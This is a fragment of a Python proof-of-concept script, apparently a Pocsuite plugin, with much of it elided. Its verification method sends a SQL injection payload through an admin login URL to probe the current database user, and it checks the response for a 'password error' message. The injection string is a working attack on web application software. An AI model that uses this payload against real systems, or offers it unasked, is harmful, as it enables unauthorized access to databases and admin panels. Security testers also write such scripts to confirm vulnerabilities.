...
class POC(POCBase):
  ...
  # 漏洞简要描述
    ...
    def _verify(self):
        result = {}
        path = "/index.php?s=/Admin/dologin/name/admin' AND ORD(MID((IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),1,1))>0 AND 'a'='a/pwd/1"
        headers={
        ...
        try:
            ...
            if resq.status_code == 200 and  '\\u5bc6\\u7801\\u9519\\u8bef' in resq.text :
                result['VerifyInfo'] = {}
